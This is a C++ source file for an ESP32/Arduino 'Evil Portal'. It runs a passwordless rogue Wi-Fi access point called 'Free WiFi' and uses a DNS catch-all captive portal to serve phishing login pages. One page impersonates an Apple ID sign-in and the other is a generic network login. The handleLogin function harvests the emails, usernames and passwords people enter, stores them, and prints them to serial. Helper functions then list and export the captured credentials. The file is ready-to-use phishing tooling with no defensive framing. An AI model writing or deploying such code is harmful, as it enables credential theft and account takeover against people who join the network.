#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <vector>
#include <string>

// Evil Portal configuration
WebServer webServer(80);
DNSServer dnsServer;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);

struct CapturedCredential {
    String username;
    String password;
    String email;
    uint32_t timestamp;
};

std::vector<CapturedCredential> captured_credentials;
bool evil_portal_active = false;
String portal_ssid = "Free WiFi";
String portal_password_redirect = "";

/**
 * HTML for fake login portal (Apple WiFi login)
 */
const char* html_apple_login = R"(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple WiFi Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
            padding: 40px;
            max-width: 400px;
            width: 90%;
        }
        .logo { text-align: center; margin-bottom: 30px; font-size: 48px; }
        h1 { color: #333; font-size: 24px; margin-bottom: 10px; text-align: center; }
        p { color: #666; text-align: center; margin-bottom: 30px; font-size: 14px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; color: #333; font-size: 14px; margin-bottom: 8px; font-weight: 500; }
        input { 
            width: 100%; 
            padding: 12px; 
            border: 1px solid #ddd; 
            border-radius: 6px; 
            font-size: 14px;
            transition: border-color 0.3s;
        }
        input:focus { outline: none; border-color: #667eea; }
        button {
            width: 100%;
            padding: 12px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
        }
        button:hover { background: #764ba2; }
        .footer { text-align: center; margin-top: 20px; color: #999; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🍎</div>
        <h1>WiFi Login Required</h1>
        <p>Please sign in with your Apple ID to continue</p>
        <form method="POST" action="/login">
            <div class="form-group">
                <label>Email</label>
                <input type="email" name="email" placeholder="your@email.com" required>
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" placeholder="••••••••" required>
            </div>
            <button type="submit">Sign In</button>
        </form>
        <div class="footer">© Apple Inc. All rights reserved.</div>
    </div>
</body>
</html>
)";

/**
 * HTML for generic credentials portal
 */
const char* html_generic_login = R"(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Network Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            padding: 30px;
            max-width: 350px;
            width: 90%;
        }
        h1 { color: #333; font-size: 22px; margin-bottom: 10px; text-align: center; }
        p { color: #666; text-align: center; margin-bottom: 25px; font-size: 13px; }
        .form-group { margin-bottom: 15px; }
        label { display: block; color: #333; font-size: 13px; margin-bottom: 5px; }
        input { 
            width: 100%; 
            padding: 10px; 
            border: 1px solid #ccc; 
            border-radius: 4px; 
            font-size: 13px;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            cursor: pointer;
        }
        button:hover { background: #45a049; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Network Authentication Required</h1>
        <p>Please enter your credentials to connect to this network</p>
        <form method="POST" action="/login">
            <div class="form-group">
                <label>Username</label>
                <input type="text" name="username" placeholder="Username" required>
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>
)";

/**
 * Success page after credential submission
 */
const char* html_success = R"(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Success</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
        h1 { color: #4CAF50; }
    </style>
</head>
<body>
    <h1>✓ Connected Successfully</h1>
    <p>You are now connected to the network.</p>
</body>
</html>
)";

/**
 * Handle login POST request and capture credentials
 */
void handleLogin() {
    if (webServer.method() == HTTP_POST) {
        CapturedCredential cred;
        cred.timestamp = millis();
        
        // Check for email (Apple portal)
        if (webServer.hasArg("email")) {
            cred.email = webServer.arg("email");
            cred.username = webServer.arg("email");
        }
        
        // Check for username
        if (webServer.hasArg("username")) {
            cred.username = webServer.arg("username");
        }
        
        // Check for password
        if (webServer.hasArg("password")) {
            cred.password = webServer.arg("password");
        }
        
        captured_credentials.push_back(cred);
        
        Serial.printf("[Evil Portal] Credentials captured:\n");
        Serial.printf("  Email/Username: %s\n", cred.username.c_str());
        Serial.printf("  Password: %s\n", cred.password.c_str());
        Serial.printf("  Timestamp: %lu\n", cred.timestamp);
        
        webServer.send(200, "text/html", html_success);
    } else {
        webServer.send(400, "text/plain", "Invalid request");
    }
}

/**
 * Handle all other requests (captive portal redirect)
 */
void handleNotFound() {
    String html = (portal_password_redirect == "apple") ? html_apple_login : html_generic_login;
    webServer.send(200, "text/html", html);
}

/**
 * Initialize Evil Portal (Fake AP + Captive Portal)
 */
bool initEvilPortal(const char* ssid, int portal_type) {
    Serial.printf("[Evil Portal] Initializing evil portal: %s\n", ssid);
    
    portal_ssid = ssid;
    if (portal_type == 1) {
        portal_password_redirect = "apple";
    } else {
        portal_password_redirect = "generic";
    }
    
    // Stop existing WiFi
    WiFi.mode(WIFI_OFF);
    delay(100);
    
    // Start AP mode
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(ssid, "");  // No password required
    
    delay(500);
    
    // Start DNS server (redirect all requests)
    dnsServer.start(DNS_PORT, "*", apIP);
    
    // Setup web server routes
    webServer.on("/login", HTTP_POST, handleLogin);
    webServer.onNotFound(handleNotFound);
    webServer.begin();
    
    Serial.println("[Evil Portal] Evil portal started successfully");
    Serial.printf("[Evil Portal] AP IP: %s\n", WiFi.softAPIP().toString().c_str());
    
    evil_portal_active = true;
    return true;
}

/**
 * Main loop for evil portal (must be called in main loop)
 */
void evilPortal_loop() {
    if (evil_portal_active) {
        dnsServer.processNextRequest();
        webServer.handleClient();
    }
}

/**
 * Stop evil portal
 */
void stopEvilPortal() {
    Serial.println("[Evil Portal] Stopping evil portal...");
    evil_portal_active = false;
    webServer.stop();
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    Serial.println("[Evil Portal] Evil portal stopped");
}

/**
 * Get captured credentials count
 */
int evilPortal_getCredentialsCount() {
    return captured_credentials.size();
}

/**
 * Get specific credential
 */
CapturedCredential evilPortal_getCredential(int index) {
    if (index >= 0 && index < captured_credentials.size()) {
        return captured_credentials[index];
    }
    return {"", "", "", 0};
}

/**
 * Get all credentials as string
 */
String evilPortal_getCredentialsString() {
    String result = "";
    for (int i = 0; i < captured_credentials.size(); i++) {
        result += "[" + String(i + 1) + "] ";
        result += "Username: " + captured_credentials[i].username + ", ";
        result += "Password: " + captured_credentials[i].password + "\n";
    }
    return result;
}

/**
 * Clear captured credentials
 */
void evilPortal_clearCredentials() {
    captured_credentials.clear();
    Serial.println("[Evil Portal] Credentials cleared");
}

/**
 * Get evil portal status
 */
bool evilPortal_getStatus() {
    return evil_portal_active;
}

/**
 * Get connected clients count
 */
int evilPortal_getConnectedClients() {
    return WiFi.softAPgetStationNum();
}
